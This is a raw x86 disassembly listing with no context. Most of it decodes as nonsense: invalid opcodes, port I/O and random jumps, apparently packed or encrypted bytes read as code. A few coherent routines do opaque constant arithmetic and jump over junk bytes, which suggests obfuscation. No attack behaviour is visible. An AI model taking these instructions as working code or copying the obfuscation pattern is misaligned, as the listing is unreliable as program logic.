  4150f6:	or     esp,DWORD PTR [ebx+0xb]
  4150f9:	lock push ecx
  4150fb:	pop    es
  4150fc:	aad    0x1b
  4150fe:	pushf  
  4150ff:	mov    ebx,0x6c4dbeff
  415104:	pop    ebp
  415105:	mov    esi,edi
  415107:	and    ebp,edi
  415109:	sub    ah,al
  41510b:	pop    ecx
  41510c:	out    dx,eax
  41510d:	scas   al,BYTE PTR es:[edi]
  41510e:	mov    esi,gs
  415110:	sahf   
  415111:	scas   al,BYTE PTR es:[edi]
  415112:	xchg   BYTE PTR [edx+0x51],ch
  415115:	push   ss
  415116:	jmp    0x2884:0x6853febe
  41511d:	mov    DWORD PTR [edx-0x5f22ad5],esi
  415123:	call   0xeb31ef25
  415128:	icebp  
  415129:	es add ecx,0xfbad4653
  415130:	neg    BYTE PTR [ecx+eiz*8-0x63923cda]
  415137:	pop    ebp
  415138:	sbb    bl,BYTE PTR [edx-0x23f66c79]
  41513e:	xor    dl,bh
  415140:	mov    esi,esp
  415142:	ins    DWORD PTR es:[edi],dx
  415143:	(bad)  
  415144:	in     eax,0x9a
  415146:	hlt    
  415147:	jnp    0x415178
  415149:	mov    al,ds:0x4bea1f20
  41514e:	into   
  41514f:	xchg   ebx,eax
  415150:	sub    al,0xfd
  415152:	lea    ebx,[ecx+esi*2+0x4d305deb]
  415159:	xadd   DWORD PTR [esi+0x19be9ce5],edi
  415160:	fnstenv [edi-0x188aa899]
  415166:	sub    al,0xf8
  415168:	sahf   
  415169:	jle    0x415111
  41516b:	mov    esp,0x8f8ebe52
  415170:	mov    ebp,0x9a7ab270
  415175:	pop    es
  415176:	mov    bl,0xf9
  415178:	xchg   ebp,eax
  415179:	jmp    0x41512c
  41517b:	add    DWORD PTR [edx-0x34f5940c],esp
  415181:	pusha  
  415182:	arpl   WORD PTR [ebx-0x35],sp
  415185:	int    0x23
  415187:	or     esp,esi
  415189:	data16 xchg BYTE PTR [esi+edx*4],bl
  41518d:	icebp  
  41518e:	mov    esp,0xae4b7b29
  415193:	and    edi,edx
  415195:	adc    al,0xd9
  415197:	jo     0x41519a
  415199:	in     eax,0xd8
  41519b:	jl     0x4151eb
  41519d:	jnp    0x415141
  41519f:	mov    fs,WORD PTR [edi-0x43]
  4151a2:	push   edi
  4151a3:	xchg   ebp,eax
  4151a4:	push   cs
  4151a5:	mov    ds:0x3dc1cb9b,eax
  4151aa:	clc    
  4151ab:	sbb    ebx,DWORD PTR [edx+0x6bb7f756]
  4151b1:	clc    
  4151b2:	mov    eax,0x4f7a108b
  4151b7:	lods   al,BYTE PTR ds:[esi]
  4151b8:	fdiv   DWORD PTR [edi]
  4151ba:	mov    ebx,0x4bd133e9
  4151bf:	imul   esp,ecx,0x6ca7bf7c
  4151c5:	retf   
  4151c6:	sbb    dh,BYTE PTR [edx+ebx*8]
  4151c9:	retf   
  4151ca:	icebp  
  4151cb:	xor    esp,DWORD PTR [esi]
  4151cd:	sbb    ebp,DWORD PTR [edi-0xe]
  4151d0:	push   ds
  4151d1:	mov    al,0x60
  4151d3:	or     cl,BYTE PTR [ebx+0x29142454]
  4151d9:	or     BYTE PTR [ecx],bl
  4151db:	push   eax
  4151dc:	add    al,0x8b
  4151de:	inc    esp
  4151df:	and    al,0xc
  4151e1:	or     DWORD PTR [eax],0xca7da575
  4151e7:	or     DWORD PTR [eax+0x4],0x9c1b89e8
  4151ee:	lea    eax,[esp+0x18]
  4151f2:	push   eax
  4151f3:	lea    eax,[esp+0x24]
  4151f7:	push   eax
  4151f8:	call   0x4127df
  4151fd:	mov    eax,DWORD PTR [esp+0x18]
  415201:	mov    ecx,DWORD PTR [esp+0x1c]
  415205:	push   DWORD PTR [ebp+0x18]
  415208:	mov    ebx,DWORD PTR [ebp+0xc]
  41520b:	push   DWORD PTR [ebp+0x14]
  41520e:	mov    esi,DWORD PTR [ebp+0x8]
  415211:	push   DWORD PTR [ebp+0x10]
  415214:	push   DWORD PTR [esp+0x20]
  415218:	push   DWORD PTR [esp+0x20]
  41521c:	push   DWORD PTR [esp+0x38]
  415220:	push   DWORD PTR [esp+0x38]
  415224:	call   0x401000
  415229:	pop    esi
  41522a:	pop    ebx
  41522b:	mov    esp,ebp
  41522d:	pop    ebp
  41522e:	ret    0x14
  415231:	push   ebp
  415232:	mov    ebp,esp
  415234:	sub    esp,0x30
  415237:	mov    DWORD PTR [ebp-0x24],0x7c16
  41523e:	mov    DWORD PTR [ebp-0x20],0x53bd
  415245:	mov    DWORD PTR [ebp-0x18],0x3bd5
  41524c:	mov    DWORD PTR [ebp-0x1c],0x6ab6
  415253:	mov    DWORD PTR [ebp-0xc],0x4b9d
  41525a:	mov    DWORD PTR [ebp-0x8],0x7e48
  415261:	mov    DWORD PTR [ebp-0x4],0x604b
  415268:	mov    DWORD PTR [ebp-0x30],0x5b69
  41526f:	mov    DWORD PTR [ebp-0x2c],0x4521
  415276:	mov    DWORD PTR [ebp-0x28],0x2979
  41527d:	mov    DWORD PTR [ebp-0x14],0x9e8
  415284:	mov    DWORD PTR [ebp-0x10],0x40e5
  41528b:	mov    ecx,DWORD PTR [ebp-0x4]
  41528e:	mov    eax,DWORD PTR [ebp-0x8]
  415291:	add    ecx,0x1d04
  415297:	xor    ecx,eax
  415299:	mov    eax,DWORD PTR [ebp-0xc]
  41529c:	and    ecx,0x6f79
  4152a2:	imul   ecx,eax
  4152a5:	xor    ecx,0xe33ab1
  4152ab:	push   esi
  4152ac:	mov    DWORD PTR [ebp-0x4],0x5989
  4152b3:	mov    DWORD PTR [ebp-0x8],0x402c1
  4152ba:	mov    DWORD PTR [ebp-0xc],0x4114
  4152c1:	mov    eax,DWORD PTR [ebp-0xc]
  4152c4:	mov    esi,DWORD PTR [ebp-0x8]
  4152c7:	xor    edx,edx
  4152c9:	sub    eax,0x6cb6
  4152ce:	div    esi
  4152d0:	mov    edx,DWORD PTR [ebp-0x4]
  4152d3:	mov    esi,DWORD PTR [ebp+0xc]
  4152d6:	or     eax,edx
  4152d8:	xor    eax,0x67f1
  4152dd:	mov    edx,ecx
  4152df:	sub    edx,eax
  4152e1:	mov    DWORD PTR [ebp-0x4],edx
  4152e4:	mov    eax,DWORD PTR [ebp-0x4]
  4152e7:	mov    edx,DWORD PTR [ebp-0x4]
  4152ea:	mov    dl,BYTE PTR [edx+esi*1]
  4152ed:	mov    esi,DWORD PTR [ebp+0x8]
  4152f0:	mov    BYTE PTR [eax+esi*1],dl
  4152f3:	jmp    0x415646
  4152f8:	mov    cl,0x4a
  4152fa:	aas    
  4152fb:	(bad)  
  4152fc:	sbb    bh,BYTE PTR [edx-0x5f]
  4152ff:	sub    dh,BYTE PTR [esi-0x7281e474]
  415305:	cmc    
  415306:	pop    edi
  415307:	jo     0x4152c5
  415309:	push   cs
  41530a:	push   ss
  41530b:	sbb    BYTE PTR [ebp-0x51e7e7ee],dh
  415311:	push   0x39
  415313:	cs cwde 
  415315:	jnp    0x41530e
  415317:	mov    esp,0x3ece231e
  41531c:	mov    ds:0xd81bbcc8,eax
  415321:	popa   
  415322:	and    eax,0xacdc0814
  415327:	xor    BYTE PTR [eax+0x60d246f],0x18
  41532e:	or     esp,DWORD PTR [eax-0x56]
  415331:	data16 ins BYTE PTR es:[edi],dx
  415333:	enter  0x8dd8,0x86
  415337:	xchg   ecx,eax
  415338:	fisttp QWORD PTR [ecx+0x7048d1f7]
  41533e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41533f:	test   eax,0x1e928b7e
  415344:	sti    
  415345:	or     edx,DWORD PTR [ebp+0x8]
  415348:	and    BYTE PTR [esp+edi*4-0x159cc95c],ch
  41534f:	das    
  415350:	cmp    BYTE PTR [edx],ah
  415352:	ficomp DWORD PTR [eax+0x7febf083]
  415358:	cs mov edi,0x60543fb2
  41535e:	imul   ebx,DWORD PTR [esi+0x7e52e942],0x5a
  415365:	mov    WORD PTR [edx+0x255c49b5],?
  41536b:	mov    ch,0xff
  41536d:	and    al,BYTE PTR [eax+0x4624335]
  415373:	push   0xf2622c35
  415378:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415379:	push   ebp
  41537a:	pop    esp
  41537b:	popfw  
  41537d:	adc    BYTE PTR [ebp+0x74],ah
  415380:	add    esi,DWORD PTR [esi+0x21]
  415383:	mov    al,0xad
  415385:	ror    DWORD PTR [edx+0x6beb9454],cl
  41538b:	dec    ebp
  41538c:	es xchg ebp,eax
  41538e:	push   esp
  41538f:	cmp    ebx,DWORD PTR [ebx]
  415391:	sbb    BYTE PTR [ecx-0x3e],bl
  415394:	inc    edi
  415395:	iret   
  415396:	inc    eax
  415397:	or     BYTE PTR [ebp+0x5a],dh
  41539a:	xchg   DWORD PTR [ecx+0x11],eax
  41539d:	pop    edi
  41539e:	push   cs
  41539f:	retf   0x4db9
  4153a2:	pop    eax
  4153a3:	pop    eax
  4153a4:	or     eax,0x48f6fc09
  4153a9:	ret    
  4153aa:	fidiv  DWORD PTR [eax+ebp*1+0x1598a76a]
  4153b1:	jnp    0x415398
  4153b3:	pop    ebp
  4153b4:	shl    DWORD PTR [edx-0x13],0xf3
  4153b8:	adc    al,bh
  4153ba:	and    DWORD PTR [ebx-0x6],edi
  4153bd:	lds    edx,FWORD PTR [esi]
  4153bf:	mov    dh,0x21
  4153c1:	inc    edx
  4153c2:	xchg   edi,eax
  4153c3:	test   eax,0x6b414b6c
  4153c8:	fistp  DWORD PTR [esi+0x29d493b4]
  4153ce:	(bad)  
  4153cf:	(bad)  
  4153d0:	jmp    0x41543e
  4153d2:	fcmovu st,st(2)
  4153d4:	adc    ebx,0x6d1445bb
  4153da:	nop
  4153db:	out    0x79,eax
  4153dd:	mov    cl,0xcb
  4153df:	std    
  4153e0:	sti    
  4153e1:	ins    DWORD PTR es:[edi],dx
  4153e2:	in     eax,dx
  4153e3:	or     DWORD PTR [esi-0x25b3ed53],esi
  4153e9:	hlt    
  4153ea:	sbb    BYTE PTR [esi+esi*8+0x44],ch
  4153ee:	stos   DWORD PTR es:[edi],eax
  4153ef:	test   DWORD PTR [ebx+0x47],ebx
  4153f2:	xor    ebx,eax
  4153f4:	leave  
  4153f5:	add    eax,DWORD PTR [esi-0x4a9e9e76]
  4153fb:	and    edx,DWORD PTR [ebx-0x22]
  4153fe:	mov    bl,0xe9
  415400:	inc    ecx
  415401:	retf   0xac0d
  415404:	shl    BYTE PTR [ecx-0x3f],1
  415407:	xor    DWORD PTR [ecx-0x6b],0xf1041d4e
  41540e:	gs into 
  415410:	adc    DWORD PTR [esp+ebp*2-0x67],eax
  415414:	mov    BYTE PTR [esi-0x4d],dh
  415417:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415418:	fst    QWORD PTR [ecx+0x2b]
  41541b:	or     eax,0x5dd6d937
  415420:	test   DWORD PTR [ebp*2+0x68b31b17],edi
  415427:	cmc    
  415428:	enter  0x13e6,0xfa
  41542c:	jo     0x415417
  41542e:	mov    bl,0x6c
  415430:	scas   eax,DWORD PTR es:[edi]
  415431:	dec    ebp
  415432:	outs   dx,BYTE PTR ds:[esi]
  415433:	les    ebx,FWORD PTR [ebx-0x36567b5f]
  415439:	sub    bh,BYTE PTR [esi-0x40406731]
  41543f:	jbe    0x41546d
  415441:	daa    
  415442:	mov    WORD PTR [ebx+0x394873a],?
  415448:	repz cld 
  41544a:	leave  
  41544b:	adc    eax,0xe9627fd6
  415450:	js     0x4154c1
  415452:	into   
  415453:	push   edx
  415454:	test   BYTE PTR [ebp+0x6f],cl
  415457:	push   edi
  415458:	cmp    DWORD PTR [ebx-0x59a9fa6f],0x86585a5c
  415462:	add    eax,esi
  415464:	mov    esi,esi
  415466:	cmp    DWORD PTR [edx+0x4744970e],ecx
  41546c:	fisubr DWORD PTR [ebx-0x79]
  41546f:	jns    0x41541b
  415471:	inc    eax
  415472:	out    dx,eax
  415473:	adc    ch,0xc3
  415476:	xor    al,0x47
  415478:	xchg   esi,eax
  415479:	mov    WORD PTR [ecx+0x5b4e30fc],gs
  41547f:	aam    0x4
  415481:	pop    edi
  415482:	lods   eax,DWORD PTR ds:[esi]
  415483:	js     0x415495
  415485:	xor    edx,DWORD PTR [ebp+0x20]
  415488:	outs   dx,DWORD PTR ds:[esi]
  415489:	popa   
  41548a:	inc    ecx
  41548b:	(bad)  
  41548c:	sar    BYTE PTR [ebp-0x24],0x7
  415490:	test   eax,0xbef2f58a
  415495:	fbld   TBYTE PTR [ebx+0x46]
  415498:	mov    al,0x94
  41549a:	rcr    DWORD PTR [edx+0x19a8153f],cl
  4154a0:	jne    0x4154e7
  4154a2:	lods   al,BYTE PTR ds:[esi]
  4154a3:	mov    esi,0x694bbe15
  4154a8:	leave  
  4154a9:	mov    eax,0xa5e8bad3
  4154ae:	inc    edi
  4154af:	aad    0x5f
  4154b1:	ficom  DWORD PTR [esp+eax*8+0x5fb77817]
  4154b8:	mov    esi,DWORD PTR [ecx+ecx*2]
  4154bb:	std    
  4154bc:	mov    ecx,0x51caeefc
  4154c1:	pop    eax
  4154c2:	mov    ebx,DWORD PTR [ebx+ebx*8+0xe]
  4154c6:	and    DWORD PTR [edi-0x7b5c6e76],ebp
  4154cc:	cmp    eax,0xfced8f7f
  4154d1:	jecxz  0x415483
  4154d3:	adc    DWORD PTR [edx-0x69e87f9c],edx
  4154d9:	pop    ds
  4154da:	aas    
  4154db:	lds    eax,FWORD PTR [eax-0x6247091c]
  4154e1:	leave  
  4154e2:	call   0x2b259704
  4154e7:	mov    edx,0x631fe2a5
  4154ec:	jbe    0x415549
  4154ee:	pop    ecx
  4154ef:	addr16 push eax
  4154f1:	out    dx,eax
  4154f2:	inc    BYTE PTR [ecx-0x20]
  4154f5:	mov    ch,0x32
  4154f7:	xchg   esi,eax
  4154f8:	sbb    al,0x45
  4154fa:	mov    ah,0x18
  4154fc:	sbb    DWORD PTR [ebx-0x37],0x13
  415500:	std    
  415501:	xor    dh,0x35
  415504:	mul    BYTE PTR [ebx-0x14]
  415507:	ss arpl WORD PTR ds:[esi*4+0x1ef32198],bx
  415510:	stos   DWORD PTR es:[edi],eax
  415511:	pop    ebp
  415512:	(bad)  
  415513:	lds    esi,FWORD PTR [eax+0x3f]
  415516:	mov    edx,0xd26c191f
  41551b:	imul   DWORD PTR [eax-0x7c]
  41551e:	inc    esi
  41551f:	(bad)  
  415520:	rol    DWORD PTR [edi-0x36],cl
  415523:	hlt    
  415524:	inc    edx
  415525:	mov    ds:0x17779025,al
  41552a:	inc    edi
  41552b:	xchg   edi,eax
  41552c:	xchg   esi,eax
  41552d:	(bad)
  415531:	mov    esi,0x407ff21a
  415536:	push   esi
  415537:	inc    edi
  415538:	jo     0x4154fe
  41553a:	xchg   esi,eax
  41553b:	imul   esp,DWORD PTR [eax-0x129ab7fa],0xf1368bb3
  415545:	cdq    
  415546:	outs   dx,BYTE PTR ds:[esi]
  415547:	and    esp,DWORD PTR [ebp+0x7f]
  41554a:	repnz push ecx
  41554c:	inc    ecx
  41554d:	mov    gs,WORD PTR [edi+eax*1+0x28dc7b79]
  415554:	in     al,0x46
  415556:	inc    ebx
  415557:	sbb    bh,0x7
  41555a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41555b:	add    esp,DWORD PTR [edx+0x7748a003]
  415561:	push   es
  415562:	inc    ecx
  415563:	xor    eax,0x993b274c
  415568:	cmp    dh,BYTE PTR [edi+0x35]
  41556b:	loop   0x4155cd
  41556d:	mov    al,ds:0x101df4bd
  415572:	xor    cl,BYTE PTR [edi+0x2535067]
  415578:	jl     0x4155c2
  41557a:	xchg   edx,eax
  41557b:	ret    
  41557c:	inc    ebx
  41557d:	ins    BYTE PTR es:[edi],dx
  41557e:	inc    ecx
  41557f:	lods   eax,DWORD PTR ds:[esi]
  415580:	mov    esp,DWORD PTR [eax+0x4b6d7de4]
  415586:	sbb    BYTE PTR [eax-0x8c9c5d3],ch
  41558c:	mov    ecx,0xc918db55
  415591:	mov    cl,0xe0
  415593:	(bad)  
  415594:	jne    0x41560a
  415596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415597:	pop    ebx
  415598:	push   esi
  415599:	push   ecx
  41559a:	repnz inc esi
  41559c:	ret    0xfe54
  41559f:	mov    bl,0x8
  4155a1:	fwait
  4155a2:	(bad)  
  4155a3:	pop    ds
  4155a4:	cmp    esi,0x2928c0c3
  4155aa:	jge    0x415585
  4155ac:	lock lods al,BYTE PTR ds:[esi]
  4155ae:	gs dec esp
  4155b0:	jp     0x415539
  4155b2:	push   es
  4155b3:	pop    edi
  4155b4:	loopne 0x4155f9
  4155b6:	or     al,0xb3
  4155b8:	xchg   edx,eax
  4155b9:	push   esi
  4155ba:	and    DWORD PTR [ebx+0x5b1a993b],esp
  4155c0:	cmp    edi,ebx
  4155c2:	push   edx
  4155c3:	retf   0xa2fb
  4155c6:	push   ebp
  4155c7:	xchg   esi,eax
  4155c8:	sbb    dl,BYTE PTR ds:0x691f5ec
  4155ce:	inc    edx
  4155cf:	in     al,0x7d
  4155d1:	cmp    eax,0xd739b45c
  4155d6:	inc    eax
  4155d7:	inc    ebx
  4155d8:	inc    ebp
  4155d9:	fld    TBYTE PTR [ecx+0x6c]
  4155dc:	(bad)  
  4155de:	jge    0x4155f1
  4155e0:	jne    0x4155f2
  4155e2:	into   
  4155e3:	inc    esi
  4155e4:	mov    eax,0x1e3ce4d6
  4155e9:	mov    bh,0x98
  4155eb:	sbb    esp,DWORD PTR [esp+edi*8-0x7c]
  4155ef:	xchg   BYTE PTR [ebp-0x7ee1432c],dl
  4155f5:	clc    
  4155f6:	mov    edi,0x9022a631
  4155fb:	sbb    al,0x41
  4155fd:	rcr    BYTE PTR [ecx],1
  4155ff:	xor    ebp,ecx
  415601:	pop    esi
  415602:	sub    eax,0xefa4a71f
  415607:	inc    edx
  415608:	jge    0x415607
  41560a:	mov    ebp,0xbb822b1e
  41560f:	sbb    DWORD PTR [ebx+0x1598d76e],esp
  415615:	sbb    eax,0xa7312e7d
  41561a:	jnp    0x41559f
  41561c:	fwait
  41561d:	mov    edx,DWORD PTR [eax-0x3e]
  415620:	dec    edx
  415621:	pop    ecx
  415622:	test   eax,0x1222339e
  415627:	inc    ebp
  415628:	sbb    DWORD PTR [ebx-0x4d465ed6],esi
  41562e:	jl     0x4155ba
  415630:	test   DWORD PTR [ecx+ecx*2+0x63],edx
  415634:	pop    ds
  415635:	cmp    eax,0x137740a9
  41563a:	pusha  
  41563b:	fidivr DWORD PTR [esi-0x3c897ad5]
  415641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415642:	or     ebp,DWORD PTR [edi+0x458b353e]
  415648:	lock mov edx,DWORD PTR [ebp-0x14]
  41564c:	imul   eax,eax,0x43bd290
  415652:	and    eax,edx
  415654:	or     eax,0x1a40
  415659:	xor    eax,0x1ac1
  41565e:	add    ecx,eax
  415660:	mov    eax,DWORD PTR [ebp-0x18]
  415663:	mov    edx,0x7380
  415668:	sub    edx,eax
  41566a:	add    edx,DWORD PTR [ebp-0x1c]
  41566d:	jmp    0x4159c0
  415672:	pop    esp
  415673:	pushf  
  415674:	lds    eax,FWORD PTR [ebp+eax*2+0x1c]
  415678:	pop    esp
  415679:	pushf  
  41567a:	push   ss
  41567b:	cwde   
  41567c:	pop    ebx
  41567d:	jo     0x415610
  41567f:	(bad)  
  415680:	jno    0x415632
  415682:	pop    eax
  415683:	or     BYTE PTR [esi],dl
  415685:	sbb    BYTE PTR [ebp-0x5fe7e7ee],dh
  41568b:	mov    ds:0x99332f6d,eax
  415690:	cmp    BYTE PTR [eax+edx*2+0x22],0x8b
  415695:	lds    edx,FWORD PTR [ebp+0x33aa53d0]
  41569b:	cmp    esp,0x28228526
  4156a1:	dec    esp
  4156a2:	adc    edi,DWORD PTR [ebp-0x31]
  4156a5:	and    edx,DWORD PTR [edx-0x4e]
  4156a8:	int3   
  4156a9:	icebp  
  4156aa:	test   eax,0x90b9821c
  4156af:	or     BYTE PTR [eax+0x7fcd80bc],0x4b
  4156b6:	in     al,0x10
  4156b8:	fwait
  4156b9:	es or  eax,0x93cabd18
  4156bf:	xchg   ebx,esp
  4156c1:	mov    cl,0x2b
  4156c3:	mov    eax,0xe1e9d1fb
  4156c8:	sbb    eax,0x3fee81a1
  4156cd:	in     eax,dx
  4156ce:	xor    BYTE PTR [esi+0x66770af8],dl
  4156d4:	pop    DWORD PTR [ecx-0x73c0d6bd]
  4156da:	inc    esi
  4156db:	or     bh,BYTE PTR [ebp+edx*4+0x31]
  4156df:	enter  0x8c6c,0x25
  4156e3:	jg     0x415737
  4156e5:	xchg   esp,eax
  4156e6:	mov    bl,ah
  4156e8:	mov    dh,0x93
  4156ea:	(bad)  
  4156eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156ec:	and    al,0x6c
  4156ee:	ror    DWORD PTR [ecx],0xf7
  4156f1:	add    ah,ah
  4156f3:	into   
  4156f4:	mov    al,ds:0xd61ad285
  4156f9:	iret   
  4156fa:	xchg   BYTE PTR [edx+0x6f029185],ch
  415700:	mov    ds,WORD PTR ds:0x68e3db70
  415706:	push   edx
  415707:	nop
  415708:	xor    al,0x62
  41570a:	jl     0x415734
  41570c:	(bad)  
  41570d:	mov    dh,0x45
  41570f:	mov    si,0xc452
  415713:	nop
  415714:	or     al,BYTE PTR [ecx-0x53ffacef]
  41571a:	sbb    al,0xc7
  41571c:	cmp    bh,BYTE PTR [ecx]
  41571e:	push   ds
  41571f:	lods   al,BYTE PTR ds:[esi]
  415720:	fild   WORD PTR [esp+eiz*4]
  415723:	add    eax,0x980403b8
  415728:	jle    0x415777
  41572a:	sub    BYTE PTR [edi+0xa],0x8f
  41572e:	imul   eax,DWORD PTR [ebp-0x39],0x3ae7930d
  415735:	ja     0x4157a7
  415737:	adc    eax,0xdd49676f
  41573c:	repnz xor bl,dl
  41573f:	push   esp
  415740:	scas   al,BYTE PTR es:[edi]
  415741:	sahf   
  415742:	pushf  
  415743:	icebp  
  415744:	and    eax,DWORD PTR [esi]
  415746:	ds add ebp,esp
  415749:	jbe    0x415737
  41574b:	pop    ds
  41574c:	dec    esp
  41574d:	popa   
  41574e:	jle    0x41575b
  415750:	xchg   DWORD PTR [edx-0x6e],edx
  415753:	ds scas eax,DWORD PTR es:[edi]
  415755:	lods   eax,DWORD PTR ds:[esi]
  415756:	sar    BYTE PTR [ecx+0x3002fbbb],cl
  41575c:	cmp    BYTE PTR [ebx-0x5df07856],ch
  415762:	js     0x41572d
  415764:	in     eax,0x3f
  415766:	add    edi,ecx
  415768:	dec    ebx
  415769:	loop   0x41578b
  41576b:	or     DWORD PTR [ebp-0x6185f6b2],esi
  415771:	ret    0x6585
  415774:	es pop es
  415776:	jns    0x41570d
  415778:	or     dl,BYTE PTR ds:0xee90db40
  41577e:	jbe    0x4157ae
  415780:	push   ss
  415781:	and    BYTE PTR [ecx+0x49],al
  415784:	or     esp,eax
  415786:	pop    es
  415787:	lahf   
  415788:	inc    ebx
  415789:	add    cl,BYTE PTR [ecx]
  41578b:	in     eax,dx
  41578c:	mov    BYTE PTR [edx+0x4e63f41d],bl
  415792:	in     eax,0x55
  415794:	lods   eax,DWORD PTR ds:[esi]
  415795:	pop    ebx
  415796:	int3   
  415797:	mov    fs,WORD PTR [eax+0x20]
  41579a:	shl    DWORD PTR [ecx+0x7af86179],1
  4157a0:	js     0x415748
  4157a2:	jnp    0x415765
  4157a4:	pusha  
  4157a5:	or     BYTE PTR [edi-0x6c8d9e9a],al
  4157ab:	sbb    edi,DWORD PTR [ebp+0x6c8ce119]
  4157b1:	(bad)  
  4157b2:	ds sti 
  4157b4:	jl     0x4157e1
  4157b6:	push   eax
  4157b7:	ror    BYTE PTR [ecx],cl
  4157b9:	xchg   edi,eax
  4157ba:	push   ecx
  4157bb:	mov    edx,0xb404180a
  4157c0:	xor    bh,bh
  4157c2:	mov    ebp,0x840c980c
  4157c7:	xchg   edi,eax
  4157c8:	(bad)
  4157cc:	jmp    eax
  4157ce:	ror    BYTE PTR [edi],0xf1
  4157d1:	fbstp  TBYTE PTR [esi*1+0x6be3e275]
  4157d8:	out    dx,al
  4157d9:	mov    ah,cl
  4157db:	cld    
  4157dc:	cmp    cl,dl
  4157de:	out    dx,al
  4157df:	fwait
  4157e0:	inc    edi
  4157e1:	xchg   ecx,eax
  4157e2:	sbb    ah,BYTE PTR [edx-0x7e]
  4157e5:	mov    DWORD PTR [edi+edx*8-0x3c],eax
  4157e9:	bound  eax,QWORD PTR [ecx-0x2c]
  4157ec:	add    al,BYTE PTR [ebx]
  4157ee:	addr16 stc 
  4157f0:	fisubr DWORD PTR [esp+eax*4+0xe]
  4157f4:	dec    ebp
  4157f5:	ds mov bh,0x4
  4157f8:	push   cs
  4157f9:	adc    BYTE PTR [esi+0x10],ah
  4157fc:	mov    al,ds:0xf7c41b2b
  415801:	outs   dx,BYTE PTR ds:[esi]
  415802:	outs   dx,DWORD PTR ds:[esi]
  415803:	adc    BYTE PTR [edi],cl
  415805:	fist   WORD PTR [eax]
  415807:	leave  
  415808:	ss or  eax,0xf588948b
  41580e:	or     al,ah
  415810:	mov    WORD PTR [edi],?
  415812:	or     al,0x3f
  415814:	dec    esp
  415815:	and    DWORD PTR [ecx],ebx
  415817:	outs   dx,DWORD PTR ds:[esi]
  415818:	push   ecx
  415819:	jb     0x41584a
  41581b:	push   cs
  41581c:	outs   dx,BYTE PTR ds:[esi]
  41581d:	xchg   esi,eax
  41581e:	loopne 0x41583a
  415820:	rcr    eax,1
  415822:	xchg   BYTE PTR [ebx-0x3a],bh
  415825:	js     0x415877
  415827:	stos   DWORD PTR es:[edi],eax
  415828:	cmp    DWORD PTR [ecx],edi
  41582a:	mov    esp,0x2967e3c2
  41582f:	sub    esp,DWORD PTR [ebx-0x1]
  415832:	pushf  
  415833:	mov    dh,0xdb
  415835:	xor    BYTE PTR [edi],bh
  415837:	mov    ebp,0x122972cc
  41583c:	(bad)  
  41583d:	int    0x6e
  41583f:	cli    
  415840:	sub    BYTE PTR [ebp-0x195c3f4b],cl
  415846:	fmul   QWORD PTR [eax+0x60]
  415849:	add    al,0x7e
  41584b:	into   
  41584c:	dec    ebp
  41584d:	and    dl,BYTE PTR [ebx-0x7f]
  415850:	jno    0x4157fc
  415852:	dec    esi
  415853:	sub    bl,BYTE PTR [edi]
  415855:	jecxz  0x415864
  415857:	pop    ebp
  415858:	push   cs
  415859:	or     DWORD PTR [ebx+0x43294279],eax
  41585f:	mov    al,ds:0x876f03e4
  415864:	imul   eax,DWORD PTR [ecx],0xb532e09e
  41586a:	pop    ds
  41586b:	sti    
  41586c:	test   DWORD PTR [edx],edi
  41586e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41586f:	cmp    al,0x71
  415871:	pop    edx
  415872:	mov    cl,0xff
  415874:	cli    
  415875:	and    al,0xed
  415877:	lods   al,BYTE PTR ds:[esi]
  415878:	in     eax,0x1d
  41587a:	clc    
  41587b:	inc    ebp
  41587c:	mov    ebp,0xd4ae1c65
  415881:	pop    ecx
  415882:	pop    ebp
  415883:	cmp    ch,BYTE PTR [eax-0x5f6120f0]
  415889:	push   edx
  41588a:	rcl    BYTE PTR [edx+0x19d37943],0x23
  415891:	enter  0xf831,0xc
  415895:	jp     0x4158a4
  415897:	jle    0x41588b
  415899:	xchg   esi,eax
  41589a:	xlat   BYTE PTR ds:[ebx]
  41589b:	jp     0x4158d7
  41589d:	clc    
  41589e:	mov    bh,0xd3
  4158a0:	xor    BYTE PTR [ecx],0x34
  4158a3:	pslld  mm5,QWORD PTR [edx+0x9]
  4158a7:	push   0xe7993697
  4158ac:	inc    eax
  4158ad:	dec    eax
  4158ae:	xor    al,0xda
  4158b0:	aam    0x5d
  4158b2:	rol    DWORD PTR [esi],0xb3
  4158b5:	arpl   WORD PTR [eax+0x23],di
  4158b8:	das    
  4158b9:	shr    BYTE PTR [esi+0x49],cl
  4158bc:	pop    ds
  4158bd:	xchg   esp,eax
  4158be:	jg     0x41585c
  4158c0:	and    eax,0x1359c503
  4158c5:	loopne 0x41593b
  4158c7:	or     eax,0x66e6c1e3
  4158cc:	and    eax,0xa84f504c
  4158d1:	fidiv  WORD PTR [ecx+0x68]
  4158d4:	pop    edi
  4158d5:	push   0x19335c11
  4158da:	cdq    
  4158db:	jo     0x415883
  4158dd:	cmp    edi,ecx
  4158df:	adc    edi,DWORD PTR [ebp+eax*8-0x13aa309c]
  4158e6:	inc    eax
  4158e7:	mov    ds:0xa170c4ee,al
  4158ec:	mov    bl,0x41
  4158ee:	scas   eax,DWORD PTR es:[edi]
  4158ef:	xor    ebx,DWORD PTR [edx-0x7e]
  4158f2:	mov    WORD PTR [ecx+ebp*1],ss
  4158f5:	mov    ah,0x1b
  4158f7:	mov    edx,0x42901fae
  4158fc:	pop    ds
  4158fd:	cld    
  4158fe:	ror    BYTE PTR [ebp-0x79ade1ae],0xb9
  415905:	cdq    
  415906:	in     eax,0x9e
  415908:	aaa    
  415909:	ret    
  41590a:	into   
  41590b:	push   0xffffffd1
  41590d:	dec    ebp
  41590e:	jp     0x415938
  415910:	sbb    ebp,DWORD PTR [ebx+edx*2-0x7a]
  415914:	ja     0x415965
  415916:	fnstenv [esi+0x35]
  415919:	sbb    BYTE PTR [edi+0x31],0xc1
  41591d:	push   edx
  41591e:	push   eax
  41591f:	and    BYTE PTR [edi+0xbe1b84f],ah
  415925:	xchg   edx,eax
  415926:	mov    eax,0xcbc36bde
  41592b:	std    
  41592c:	shr    BYTE PTR [esi+ecx*8],0x5e
  415930:	imul   esi,ebp,0xffffffb6
  415933:	adc    BYTE PTR [edx+edx*1+0xbf7cf92],dl
  41593a:	mov    WORD PTR [edi-0x716e2414],ds
